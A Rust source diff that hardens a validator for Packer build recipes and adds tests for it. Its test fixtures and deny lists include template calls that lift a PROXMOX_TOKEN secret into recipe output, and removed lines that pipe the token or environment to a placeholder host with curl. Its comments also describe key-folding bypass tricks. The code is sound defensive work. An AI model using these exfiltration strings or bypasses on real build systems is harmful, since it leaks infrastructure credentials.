@@ -163,22 +163,7 @@ impl RecipeContent {
         // provisioner allowlist and the template functions that read that
         // environment, at publish time, before the version is frozen.
         if let Some(reason) = recipe_build_refusal(&self.content) {
-            return Err(match reason {
-                "recipe_forbidden_template_function" => {
-                    "the recipe uses a template function that reads the controller environment, \
-                     files, or a secret store (for example `{{env}}`, `{{vault}}`, \
-                     `{{consul_key}}`, `{{aws_secretsmanager}}`), which could read the build's \
-                     Proxmox token"
-                }
-                "recipe_forbidden_top_level_key" => {
-                    "the recipe has a top-level key Fleet does not allow; only builders, \
-                     provisioners, variables, sensitive-variables, description, and \
-                     min_packer_version are permitted (post-processors and \
-                     error-cleanup-provisioner run with the build's Proxmox token and are refused)"
-                }
-                _ => "the recipe content must be a JSON object",
-            }
-            .to_owned());
+            return Err(recipe_refusal_message(reason).to_owned());
         }
         self.content_digest()?;
         Ok(())
@@ -214,14 +199,14 @@ pub fn requests_insecure_tls(content: &str) -> bool {
     })
 }
 
-/// The legacy-JSON top-level keys a Fleet recipe may carry. Fail-closed,
-/// like the provisioner allowlist: any other top-level key — notably
-/// `post-processors` (a `shell-local` post-processor runs on the
-/// controller with the build's full environment) and
-/// `error-cleanup-provisioner` (likewise a provisioner outside the
-/// `has_external_assets` allowlist) — is refused (#313). `builders`,
-/// `provisioners`, `variables`, and `sensitive-variables` are the recipe's
-/// substance; `description` and `min_packer_version` are inert metadata.
+/// The legacy-JSON top-level keys a Fleet recipe may carry, in their exact
+/// canonical spelling. Fail-closed, like the provisioner allowlist: any
+/// other top-level key is refused (#313). That covers `post-processors` (a
+/// `shell-local` post-processor runs on the controller with the build's
+/// environment), `error-cleanup-provisioner` (a provisioner outside the
+/// `has_external_assets` allowlist), Packer's `_`-prefixed root comments,
+/// and every case variant: Packer matches root keys case-insensitively, so
+/// `Provisioners` would be honored while exact-case checks elsewhere skip it.
 const ALLOWED_TOP_LEVEL_KEYS: &[&str] = &[
     "builders",
     "provisioners",
@@ -233,18 +218,18 @@ const ALLOWED_TOP_LEVEL_KEYS: &[&str] = &[
 
 /// Legacy-JSON template-engine functions that read the controller
 /// environment, local files, or a remote secret store, and so can lift the
-/// build's `PROXMOX_TOKEN` (or any other secret) out of the process and
-/// into recipe-controlled output (#313). Compared case-insensitively.
+/// build's `PROXMOX_TOKEN` (or any other secret) into recipe-controlled
+/// output (#313). Matched case-insensitively: Go's lookup is exact, so
+/// this is only stricter.
 ///
 /// `env` reads the child environment; `consul_key`, `vault`,
 /// `aws_secretsmanager`, and `aws_secretsmanager_raw` reach remote secret
-/// stores from the controller (and the AWS calls read `~/.aws`). Enumerated
-/// from the `FuncGens` table in `packer-plugin-sdk`'s
-/// `template/interpolate/funcs.go` and Packer's legacy-JSON engine and
-/// user-variable docs. Packer only enables these inside a user-variable
-/// default, but a value lifted there flows anywhere through `{{user}}`, so
-/// Fleet refuses the function names anywhere. The safe functions (`user`,
-/// `timestamp`, `isotime`, `uuid`, string helpers, `build_name`,
+/// stores from the controller (and the AWS calls read `~/.aws`). Taken from
+/// the `FuncGens` table in `packer-plugin-sdk`'s
+/// `template/interpolate/funcs.go`. Packer enables them only in a
+/// user-variable default, but a value lifted there flows anywhere through
+/// `{{user}}`, so Fleet refuses the names anywhere. The other functions
+/// (`user`, `timestamp`, `isotime`, `uuid`, string helpers, `build_name`,
 /// `build_type`, `pwd`, `template_dir`, `packer_version`, ...) stay allowed.
 const FORBIDDEN_TEMPLATE_FUNCS: &[&str] = &[
     "env",
@@ -254,136 +239,397 @@ const FORBIDDEN_TEMPLATE_FUNCS: &[&str] = &[
     "aws_secretsmanager_raw",
 ];
 
+/// Builder keys that read files on the controller and ship them to the
+/// guest or to PVE: `http_directory` serves a controller directory to the
+/// guest over HTTP, `cd_files` packs controller files into an ISO that is
+/// uploaded and attached. Matched case-insensitively, at any depth inside a
+/// builder (so `additional_iso_files[]` counts too).
+const CONTROLLER_FILE_KEYS: &[&str] =
+    &["http_directory", "cd_files", "floppy_files", "floppy_dirs"];
+
+/// Every stable reason [`recipe_build_refusal`] can return.
+pub const RECIPE_REFUSAL_REASONS: &[&str] = &[
+    "recipe_content_not_json_object",
+    "recipe_duplicate_key",
+    "recipe_non_ascii_key",
+    "recipe_forbidden_top_level_key",
+    "recipe_forbidden_template_function",
+    "recipe_template_malformed",
+    "recipe_controller_file_input",
+];
+
 /// A stable, secret-free reason a recipe's structure is refused before any
 /// credential is resolved, or `None` when the structure is acceptable.
 ///
 /// Enforced at publish time (through [`RecipeContent::validate`], the only
 /// path content enters a recipe) and again before every build, so a version
 /// stored before this gate existed is refused with a stable code rather
-/// than built. The check never resolves or inspects a secret; it reads only
-/// the recipe bytes the principal with `images.config` already controls.
+/// than built. The check reads only the recipe bytes.
 ///
-/// Fail-closed:
-/// - content that is not a JSON object is refused (Fleet recipes are
-///   legacy JSON templates, written to Packer as `.json`; a non-object
-///   cannot be structurally vetted and could never build);
-/// - any top-level key outside [`ALLOWED_TOP_LEVEL_KEYS`] is refused
-///   (case-insensitively, as Packer's `mapstructure` decoding matches);
-/// - any [`FORBIDDEN_TEMPLATE_FUNCS`] call in any decoded string — a key
-///   or a value, at any depth — is refused: nested variable defaults,
-///   `{{user}}` indirection, provisioner `environment_vars`, a VM name, a
-///   `boot_command`, all count. Scanning the *decoded* JSON strings (not
-///   the raw bytes) closes the `"{{env..."` escape, since the
-///   JSON parser resolves `\u` and `\"` before the scan sees the string.
+/// Fail-closed, in order:
+/// - the content must be one JSON object (`recipe_content_not_json_object`);
+/// - no object, at any depth, may repeat a key, exactly or up to ASCII case
+///   (`recipe_duplicate_key`): `serde_json` keeps the last duplicate, while
+///   Packer's case-insensitive decoder may keep another one;
+/// - no key, at any depth, may contain non-ASCII characters
+///   (`recipe_non_ascii_key`): Go's `EqualFold` folds e.g. `ſ` (U+017F) to
+///   `s`, so `proviſioners` is a `provisioners` block to Packer;
+/// - only the exact keys in [`ALLOWED_TOP_LEVEL_KEYS`] may appear at the top
+///   level (`recipe_forbidden_top_level_key`);
+/// - no decoded string — key or value, at any depth — may call a function in
+///   [`FORBIDDEN_TEMPLATE_FUNCS`] (`recipe_forbidden_template_function`) or
+///   carry a template action Fleet cannot lex the way Go's `text/template`
+///   does (`recipe_template_malformed`). The scan runs after JSON decoding,
+///   so `"{{env ..."` is caught;
+/// - no builder may read controller files or fetch from the controller
+///   (`recipe_controller_file_input`): see [`CONTROLLER_FILE_KEYS`]; an
+///   `iso_url`/`iso_urls` needs `iso_download_pve: true` in the same block
+///   and a literal `http(s)://` URL (so PVE downloads it, not go-getter on
+///   the controller); an `iso_checksum` must be a literal hash or `none`
+///   (a `file:` checksum is fetched on the controller, even by `validate`).
 #[must_use]
 pub fn recipe_build_refusal(content: &str) -> Option<&'static str> {
+    if let Err(reason) = audit_keys(content) {
+        return Some(reason);
+    }
     let Ok(value) = serde_json::from_str::<serde_json::Value>(content) else {
         return Some("recipe_content_not_json_object");
     };
     let serde_json::Value::Object(object) = &value else {
         return Some("recipe_content_not_json_object");
     };
-    if object.keys().any(|key| {
-        !ALLOWED_TOP_LEVEL_KEYS
-            .iter()
-            .any(|allowed| key.eq_ignore_ascii_case(allowed))
-    }) {
+    if object
+        .keys()
+        .any(|key| !ALLOWED_TOP_LEVEL_KEYS.contains(&key.as_str()))
+    {
         return Some("recipe_forbidden_top_level_key");
     }
-    if value_calls_forbidden_function(&value) {
-        return Some("recipe_forbidden_template_function");
+    match value_template_scan(&value) {
+        TemplateScan::Clean => {}
+        TemplateScan::Forbidden => return Some("recipe_forbidden_template_function"),
+        TemplateScan::Malformed => return Some("recipe_template_malformed"),
+    }
+    let builders = object
+        .get("builders")
+        .and_then(serde_json::Value::as_array)
+        .map_or(&[][..], Vec::as_slice);
+    if builders.iter().any(reads_controller_inputs) {
+        return Some("recipe_controller_file_input");
     }
     None
 }
 
-/// Whether any decoded string in the JSON value — object key, object value,
-/// or array element, recursively — calls a forbidden template function.
-fn value_calls_forbidden_function(value: &serde_json::Value) -> bool {
+/// The operator-facing explanation of a [`recipe_build_refusal`] reason.
+#[must_use]
+pub fn recipe_refusal_message(reason: &str) -> &'static str {
+    match reason {
+        "recipe_duplicate_key" => {
+            "the recipe repeats a key in one object (exactly or in another letter case); \
+             Packer could act on a different copy than Fleet checks"
+        }
+        "recipe_non_ascii_key" => {
+            "the recipe has a key with non-ASCII characters; Packer folds some of them \
+             onto ASCII keys, so Fleet refuses them"
+        }
+        "recipe_forbidden_top_level_key" => {
+            "the recipe has a top-level key Fleet does not allow; only builders, \
+             provisioners, variables, sensitive-variables, description, and \
+             min_packer_version are permitted, spelled exactly so (post-processors, \
+             error-cleanup-provisioner, and `_` comments are refused)"
+        }
+        "recipe_forbidden_template_function" => {
+            "the recipe uses a template function that reads the controller environment, \
+             files, or a secret store (env, vault, consul_key, aws_secretsmanager, \
+             aws_secretsmanager_raw), which could read the build's Proxmox token"
+        }
+        "recipe_template_malformed" => {
+            "the recipe has a template action Fleet cannot check (an unclosed `{{`, \
+             comment, or quoted string)"
+        }
+        "recipe_controller_file_input" => {
+            "the recipe reads files on the controller (http_directory, cd_files), \
+             fetches an ISO on the controller (iso_url without iso_download_pve, or a \
+             non-http(s) URL), or uses a non-literal iso_checksum"
+        }
+        _ => "the recipe content must be a JSON object",
+    }
+}
+
+/// Walks the raw JSON once, refusing duplicate (exact or ASCII-case) and
+/// non-ASCII keys at any depth. Content that is not JSON at all is
+/// reported as not being a JSON object.
+fn audit_keys(content: &str) -> Result<(), &'static str> {
+    const DUPLICATE: &str = "fleet-recipe-duplicate-key";
+    const NON_ASCII: &str = "fleet-recipe-non-ascii-key";
+
+    struct Audit;
+    impl<'de> serde::de::Visitor<'de> for Audit {
+        type Value = Audit;
+        fn expecting(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+            f.write_str("JSON")
+        }
+        fn visit_bool<E>(self, _: bool) -> Result<Audit, E> {
+            Ok(Audit)
+        }
+        fn visit_i64<E>(self, _: i64) -> Result<Audit, E> {
+            Ok(Audit)
+        }
+        fn visit_u64<E>(self, _: u64) -> Result<Audit, E> {
+            Ok(Audit)
+        }
+        fn visit_f64<E>(self, _: f64) -> Result<Audit, E> {
+            Ok(Audit)
+        }
+        fn visit_str<E>(self, _: &str) -> Result<Audit, E> {
+            Ok(Audit)
+        }
+        fn visit_unit<E>(self) -> Result<Audit, E> {
+            Ok(Audit)
+        }
+        fn visit_seq<A: serde::de::SeqAccess<'de>>(self, mut seq: A) -> Result<Audit, A::Error> {
+            while seq.next_element::<Audit>()?.is_some() {}
+            Ok(Audit)
+        }
+        fn visit_map<A: serde::de::MapAccess<'de>>(self, mut map: A) -> Result<Audit, A::Error> {
+            use serde::de::Error as _;
+            let mut seen = std::collections::HashSet::new();
+            while let Some(key) = map.next_key::<String>()? {
+                if !key.is_ascii() {
+                    return Err(A::Error::custom(NON_ASCII));
+                }
+                if !seen.insert(key.to_ascii_lowercase()) {
+                    return Err(A::Error::custom(DUPLICATE));
+                }
+                map.next_value::<Audit>()?;
+            }
+            Ok(Audit)
+        }
+    }
+    impl<'de> Deserialize<'de> for Audit {
+        fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
+            deserializer.deserialize_any(Audit)
+        }
+    }
+
+    let mut deserializer = serde_json::Deserializer::from_str(content);
+    let audited = Audit::deserialize(&mut deserializer).and_then(|_| deserializer.end());
+    match audited {
+        Ok(()) => Ok(()),
+        Err(error) if error.to_string().contains(DUPLICATE) => Err("recipe_duplicate_key"),
+        Err(error) if error.to_string().contains(NON_ASCII) => Err("recipe_non_ascii_key"),
+        Err(_) => Err("recipe_content_not_json_object"),
+    }
+}
+
+/// Whether one builder block — at any depth, so `boot_iso` and
+/// `additional_iso_files[]` count — reads controller files or makes the
+/// controller fetch something.
+fn reads_controller_inputs(value: &serde_json::Value) -> bool {
     match value {
-        serde_json::Value::String(text) => forbidden_template_function(text).is_some(),
-        serde_json::Value::Array(items) => items.iter().any(value_calls_forbidden_function),
-        serde_json::Value::Object(object) => object.iter().any(|(key, child)| {
-            forbidden_template_function(key).is_some() || value_calls_forbidden_function(child)
-        }),
+        serde_json::Value::Array(items) => items.iter().any(reads_controller_inputs),
+        serde_json::Value::Object(object) => {
+            let field = |name: &str| {
+                object
+                    .iter()
+                    .find(|(key, _)| key.eq_ignore_ascii_case(name))
+                    .map(|(_, value)| value)
+            };
+            if object.keys().any(|key| {
+                CONTROLLER_FILE_KEYS
+                    .iter()
+                    .any(|name| key.eq_ignore_ascii_case(name))
+            }) {
+                return true;
+            }
+            let urls: Vec<&serde_json::Value> = ["iso_url", "iso_urls"]
+                .iter()
+                .filter_map(|name| field(name))
+                .flat_map(|value| match value {
+                    serde_json::Value::Array(items) => items.iter().collect(),
+                    other => vec![other],
+                })
+                .collect();
+            if !urls.is_empty() {
+                let pve_downloads =
+                    field("iso_download_pve") == Some(&serde_json::Value::Bool(true));
+                let literal_http = urls.iter().all(|url| {
+                    url.as_str().is_some_and(|url| {
+                        (url.starts_with("https://") || url.starts_with("http://"))
+                            && !url.contains("{{")
+                    })
+                });
+                if !pve_downloads || !literal_http {
+                    return true;
+                }
+            }
+            if field("iso_checksum")
+                .is_some_and(|checksum| !checksum.as_str().is_some_and(literal_checksum))
+            {
+                return true;
+            }
+            object.values().any(reads_controller_inputs)
+        }
         _ => false,
     }
 }
 
-/// The first forbidden template-engine function call found in one decoded
-/// string, if any. Scans every `{{ ... }}` action (Go template delimiters),
-/// tolerating whitespace and the `{{-` / `-}}` trim markers, and matches a
-/// forbidden function used as a bare word — directly (`{{env ...}}`,
-/// `{{ env ...}}`, `{{- env ...}}`) or through a pipeline
-/// (`{{ "PROXMOX_TOKEN" | env }}`). Quoted and backtick string literals
-/// inside the action are skipped first, so a user variable literally named
-/// `env` (`{{user `env`}}`) is not a false positive while an actual `env`
-/// call is still caught.
-fn forbidden_template_function(content: &str) -> Option<&'static str> {
-    let bytes = content.as_bytes();
-    let mut i = 0;
-    while i + 1 < bytes.len() {
-        if bytes[i] == b'{' && bytes[i + 1] == b'{' {
-            // Scan to the matching `}}`, or end of input (fail-closed).
-            let start = i + 2;
-            let end = find_action_end(&bytes[start..]).map_or(bytes.len(), |rel| start + rel);
-            if let Some(func) = scan_action(&content[start..end]) {
-                return Some(func);
-            }
-            i = end;
+/// `none`, a bare hex digest, or `<algorithm>:<hex digest>`: the forms that
+/// Packer checks locally without fetching anything.
+fn literal_checksum(value: &str) -> bool {
+    if value == "none" {
+        return true;
+    }
+    let digest = value.split_once(':').map_or(value, |(algorithm, digest)| {
+        if algorithm.is_empty() || !algorithm.bytes().all(|b| b.is_ascii_alphanumeric()) {
+            ""
         } else {
-            i += 1;
+            digest
         }
-    }
-    None
+    });
+    !digest.is_empty() && digest.bytes().all(|b| b.is_ascii_hexdigit())
 }
 
-/// The byte offset of the closing `}}` within an action body, if present.
-fn find_action_end(body: &[u8]) -> Option<usize> {
-    let mut j = 0;
-    while j + 1 < body.len() {
-        if body[j] == b'}' && body[j + 1] == b'}' {
-            return Some(j);
-        }
-        j += 1;
-    }
-    None
+/// What scanning the template actions in a string found.
+#[derive(Debug, PartialEq, Eq)]
+enum TemplateScan {
+    Clean,
+    Forbidden,
+    Malformed,
 }
 
-/// Whether an action body (the text between `{{` and `}}`) calls a
-/// forbidden function. String literals are blanked first so a function name
-/// appearing as literal data is not matched.
-fn scan_action(body: &str) -> Option<&'static str> {
-    let mut cleaned = String::with_capacity(body.len());
-    let mut quote: Option<char> = None;
-    for ch in body.chars() {
-        match quote {
-            Some(q) => {
-                if ch == q {
-                    quote = None;
-                }
-                cleaned.push(' ');
-            }
-            None => {
-                if ch == '"' || ch == '\'' || ch == '`' {
-                    quote = Some(ch);
-                    cleaned.push(' ');
-                } else {
-                    cleaned.push(ch);
-                }
-            }
+/// Scans every decoded string in the JSON value — object key, object value,
+/// or array element, recursively. The worst finding wins.
+fn value_template_scan(value: &serde_json::Value) -> TemplateScan {
+    let mut worst = TemplateScan::Clean;
+    let mut note = |scan: TemplateScan| {
+        if scan != TemplateScan::Clean && worst != TemplateScan::Forbidden {
+            worst = scan;
         }
-    }
-    // Split on any character that cannot be part of a function identifier,
-    // then match whole words against the forbidden set.
-    for word in cleaned.split(|c: char| !(c.is_ascii_alphanumeric() || c == '_')) {
-        if let Some(found) = FORBIDDEN_TEMPLATE_FUNCS
+    };
+    match value {
+        serde_json::Value::String(text) => note(template_scan(text)),
+        serde_json::Value::Array(items) => items
             .iter()
-            .find(|func| word.eq_ignore_ascii_case(func))
-        {
-            return Some(found);
+            .for_each(|item| note(value_template_scan(item))),
+        serde_json::Value::Object(object) => {
+            for (key, child) in object {
+                note(template_scan(key));
+                note(value_template_scan(child));
+            }
+        }
+        _ => {}
+    }
+    worst
+}
+
+/// Scans one decoded string for template actions the way Go's
+/// `text/template` lexer reads them, with the default `{{`/`}}`
+/// delimiters Packer uses:
+///
+/// - text outside actions is inert; an action starts at `{{`, optionally
+///   followed by a `-` trim marker and whitespace;
+/// - `{{/* ... */}}` is a comment (also with trim markers); one that never
+///   closes, or is not followed by `}}`, is malformed;
+/// - inside an action, `"..."` (backslash escapes, no newline), `'...'`
+///   (a rune literal, backslash escapes, no newline), and `` `...` `` (raw,
+///   newlines allowed) are literals; an unterminated one is malformed, so no
+///   quote can swallow the rest of an action;
+/// - an action that reaches the end of the string without `}}` is
+///   malformed;
+/// - every other run of ASCII letters, digits, and `_` is a word, and a word
+///   equal to a forbidden function name is a forbidden call. Go identifiers
+///   may also hold non-ASCII letters, so splitting on ASCII is stricter than
+///   Go: a Go identifier `env` is always bounded by non-ASCII-word chars.
+fn template_scan(text: &str) -> TemplateScan {
+    let chars: Vec<char> = text.chars().collect();
+    let len = chars.len();
+    let at = |i: usize, s: &str| {
+        s.chars()
+            .enumerate()
+            .all(|(k, c)| chars.get(i + k) == Some(&c))
+    };
+    let mut i = 0;
+    while i < len {
+        if !at(i, "{{") {
+            i += 1;
+            continue;
+        }
+        i += 2;
+        if chars.get(i) == Some(&'-') && chars.get(i + 1).is_some_and(char::is_ascii_whitespace) {
+            i += 2;
+            while chars.get(i).is_some_and(char::is_ascii_whitespace) {
+                i += 1;
+            }
+        }
+        if at(i, "/*") {
+            let Some(end) = (i + 2..len).find(|&j| at(j, "*/")) else {
+                return TemplateScan::Malformed;
+            };
+            i = end + 2;
+            if chars.get(i).is_some_and(char::is_ascii_whitespace) && chars.get(i + 1) == Some(&'-')
+            {
+                i += 2;
+            }
+            if !at(i, "}}") {
+                return TemplateScan::Malformed;
+            }
+            i += 2;
+            continue;
+        }
+        let mut word = String::new();
+        let forbidden = |word: &str| {
+            FORBIDDEN_TEMPLATE_FUNCS
+                .iter()
+                .any(|func| word.eq_ignore_ascii_case(func))
+        };
+        loop {
+            let Some(&c) = chars.get(i) else {
+                return TemplateScan::Malformed;
+            };
+            if c.is_ascii_alphanumeric() || c == '_' {
+                word.push(c);
+                i += 1;
+                continue;
+            }
+            if forbidden(&word) {
+                return TemplateScan::Forbidden;
+            }
+            word.clear();
+            if at(i, "}}") {
+                i += 2;
+                break;
+            }
+            match c {
+                '"' | '\'' => {
+                    i += 1;
+                    loop {
+                        match chars.get(i) {
+                            None | Some('\n') => return TemplateScan::Malformed,
+                            Some('\\') => {
+                                if matches!(chars.get(i + 1), None | Some('\n')) {
+                                    return TemplateScan::Malformed;
+                                }
+                                i += 2;
+                            }
+                            Some(&q) if q == c => {
+                                i += 1;
+                                break;
+                            }
+                            Some(_) => i += 1,
+                        }
+                    }
+                }
+                '`' => {
+                    let Some(end) = (i + 1..len).find(|&j| chars[j] == '`') else {
+                        return TemplateScan::Malformed;
+                    };
+                    i = end + 1;
+                }
+                _ => i += 1,
+            }
         }
     }
-    None
+    TemplateScan::Clean
 }
 
 /// A published recipe version: immutable, identified by its digest.
@@ -502,7 +748,7 @@ mod tests {
             r#"{"variables":{"t":"{{ `PROXMOX_TOKEN` | env }}"}}"#,
             r#"{"variables":{"t":"{{ENV `PROXMOX_TOKEN`}}"}}"#,
             r#"{"builders":[{"type":"proxmox-clone","vm_name":"{{env `PROXMOX_TOKEN`}}"}]}"#,
-            r#"{"provisioners":[{"type":"shell","inline":["echo {{env `PROXMOX_TOKEN`}} | curl -d @- https://x"]}]}"#,
+            r#"{"provisioners":[{"type":"shell","inline":["echo {{env `PROXMOX_TOKEN`}}"]}]}"#,
             r#"{"provisioners":[{"type":"shell","environment_vars":["T={{env `PROXMOX_TOKEN`}}"],"inline":["true"]}]}"#,
             // JSON `\u` escapes decode to `{{env `PROXMOX_TOKEN`}}` before
             // Packer's engine sees the string: scanning decoded strings
@@ -539,7 +785,7 @@ mod tests {
     fn forbidden_top_level_keys_and_non_objects_are_refused() {
         assert_eq!(
             recipe_build_refusal(
-                r#"{"builders":[],"post-processors":[{"type":"shell-local","inline":["env | curl -d @- https://x"]}]}"#
+                r#"{"builders":[],"post-processors":[{"type":"shell-local","inline":["true"]}]}"#
             ),
             Some("recipe_forbidden_top_level_key"),
         );
@@ -577,6 +823,161 @@ mod tests {
             r#"{"builders":[{"type":"proxmox-clone","template_name":"img-{{timestamp}}","vm_id":901}]}"#,
         ] {
             assert_eq!(recipe_build_refusal(content), None, "{content}");
+        }
+    }
+
+    #[test]
+    fn duplicate_keys_are_refused_at_any_depth_and_in_any_case() {
+        // serde keeps the last duplicate; Packer's case-insensitive decoder
+        // may honor another copy, so any repeat is ambiguous.
+        for content in [
+            r#"{"builders":[],"builders":[]}"#,
+            r#"{"builders":[],"provisioners":[],"Provisioners":[]}"#,
+            r#"{"builders":[{"type":"proxmox-clone","vm_name":"a","VM_NAME":"b"}]}"#,
+            r#"{"builders":[],"variables":{"t":"a","t":"b"}}"#,
+            r#"{"builders":[],"provisioners":[{"type":"shell","inline":["true"],"Type":"shell"}]}"#,
+        ] {
+            assert_eq!(
+                recipe_build_refusal(content),
+                Some("recipe_duplicate_key"),
+                "{content}"
+            );
+        }
+    }
+
+    #[test]
+    fn top_level_keys_must_use_their_canonical_spelling() {
+        // Packer 1.16.1 honors `Provisioners` as a provisioners block, while
+        // the executor's provisioner allowlist reads only `provisioners`.
+        for content in [
+            r#"{"builders":[],"Provisioners":[{"type":"shell-local","inline":["true"]}]}"#,
+            r#"{"BUILDERS":[]}"#,
+            r#"{"builders":[],"Variables":{}}"#,
+        ] {
+            assert_eq!(
+                recipe_build_refusal(content),
+                Some("recipe_forbidden_top_level_key"),
+                "{content}"
+            );
+        }
+    }
+
+    #[test]
+    fn non_ascii_keys_are_refused_at_any_depth() {
+        // Go's EqualFold folds U+017F (long s) to `s` and U+212A (Kelvin) to
+        // `k`: Packer 1.16.1 honors `provi\u{17f}ioners` as `provisioners`.
+        // The fixtures spell the keys with JSON `\u` escapes, which decode to
+        // the non-ASCII characters before the check.
+        for content in [
+            r#"{"builders":[],"provi\u017fioners":[]}"#,
+            r#"{"builders":[],"post-proce\u017f\u017fors":[]}"#,
+            r#"{"builders":[{"type":"proxmox-clone","\u212aey":"x"}]}"#,
+            r#"{"builders":[],"variables":{"caf\u00e9":"x"}}"#,
+        ] {
+            assert_eq!(
+                recipe_build_refusal(content),
+                Some("recipe_non_ascii_key"),
+                "{content}"
+            );
+        }
+        // Non-ASCII values are fine.
+        assert_eq!(
+            recipe_build_refusal(r#"{"description":"caf\u00e9","builders":[]}"#),
+            None
+        );
+    }
+
+    #[test]
+    fn the_template_lexer_follows_text_template_quoting() {
+        let scan = |text: &str| {
+            recipe_build_refusal(&serde_json::json!({ "variables": { "v": text } }).to_string())
+        };
+        let forbidden = Some("recipe_forbidden_template_function");
+        let malformed = Some("recipe_template_malformed");
+        // A `}}` inside a string literal does not close the action (Packer
+        // 1.16.1 accepts `{{ printf "%s}}" "a" }}`), so a call after it is
+        // still inside the action.
+        assert_eq!(scan(r#"{{ printf "%s}}" (env `T`) }}"#), forbidden);
+        assert_eq!(scan(r#"{{ "a\"b" | printf "%s" }}{{env `T`}}"#), forbidden);
+        assert_eq!(scan(r"{{ printf `%c` 'a' }}{{ env `T` }}"), forbidden);
+        assert_eq!(scan(r"{{ printf `%c` '\'' }}{{ env `T` }}"), forbidden);
+        // An unterminated literal or action cannot hide what follows: Packer
+        // refuses all of these, and so does Fleet.
+        for text in [
+            "{{ printf `%s` 'ab }} {{env `T`}}",
+            "{{ 'x}}",
+            "{{ \"open }}",
+            "{{ \"a\nb\" }}",
+            "{{ `raw",
+            "{{ timestamp",
+            "{{/* note }}",
+            "{{/* note */ x}}",
+        ] {
+            assert_eq!(scan(text), malformed, "{text:?}");
+        }
+        // Comments, trim markers, and plain text pass.
+        for text in [
+            "{{/* env */}}",
+            "{{- /* note */ -}}",
+            "{{- timestamp -}}",
+            "{{ printf \"%s}}\" \"a\" }}",
+            "plain }} text",
+            "{{user `env`}}",
+        ] {
+            assert_eq!(scan(text), None, "{text:?}");
+        }
+    }
+
+    #[test]
+    fn builders_may_not_read_or_fetch_controller_inputs() {
+        let builder = |extra: serde_json::Value| {
+            let mut block = serde_json::json!({ "type": "proxmox-iso" });
+            for (key, value) in extra.as_object().unwrap() {
+                block[key] = value.clone();
+            }
+            recipe_build_refusal(&serde_json::json!({ "builders": [block] }).to_string())
+        };
+        let refused = Some("recipe_controller_file_input");
+        for extra in [
+            serde_json::json!({ "http_directory": "." }),
+            serde_json::json!({ "HTTP_Directory": "." }),
+            serde_json::json!({ "additional_iso_files": [{ "cd_files": ["./x"] }] }),
+            serde_json::json!({ "boot_iso": { "iso_url": "https://example.test/x.iso" } }),
+            serde_json::json!({ "boot_iso": { "iso_url": "./x.iso", "iso_download_pve": true } }),
+            serde_json::json!({ "boot_iso": { "iso_url": "file:///x.iso", "iso_download_pve": true } }),
+            serde_json::json!({ "boot_iso": { "iso_urls": ["https://example.test/x.iso", "git::x"], "iso_download_pve": true } }),
+            serde_json::json!({ "boot_iso": { "iso_url": "https://example.test/x.iso", "iso_download_pve": "true" } }),
+            serde_json::json!({ "iso_url": "https://example.test/{{user `p`}}", "iso_download_pve": true }),
+            serde_json::json!({ "boot_iso": { "iso_file": "local:iso/x.iso", "iso_checksum": "file:./sums" } }),
+            serde_json::json!({ "boot_iso": { "iso_file": "local:iso/x.iso", "iso_checksum": "https://example.test/sums" } }),
+            serde_json::json!({ "boot_iso": { "iso_file": "local:iso/x.iso", "iso_checksum": "{{user `c`}}" } }),
+        ] {
+            assert_eq!(builder(extra.clone()), refused, "{extra}");
+        }
+        for extra in [
+            serde_json::json!({ "boot_iso": { "iso_file": "local:iso/x.iso" } }),
+            serde_json::json!({ "boot_iso": { "iso_url": "https://example.test/x.iso", "iso_download_pve": true, "iso_checksum": "sha256:0123abcd" } }),
+            serde_json::json!({ "boot_iso": { "iso_file": "local:iso/x.iso", "iso_checksum": "none" } }),
+            serde_json::json!({ "http_content": { "/user-data": "#cloud-config" } }),
+        ] {
+            assert_eq!(builder(extra.clone()), None, "{extra}");
+        }
+    }
+
+    #[test]
+    fn packer_root_comments_are_refused() {
+        // Packer accepts `_`-prefixed root keys as comments; Fleet has no use
+        // for them and refuses every key outside the allowlist.
+        assert_eq!(
+            recipe_build_refusal(r#"{"_comment":"note","builders":[]}"#),
+            Some("recipe_forbidden_top_level_key")
+        );
+    }
+
+    #[test]
+    fn every_refusal_reason_has_a_message() {
+        for reason in RECIPE_REFUSAL_REASONS {
+            assert!(!recipe_refusal_message(reason).is_empty(), "{reason}");
         }
     }
 
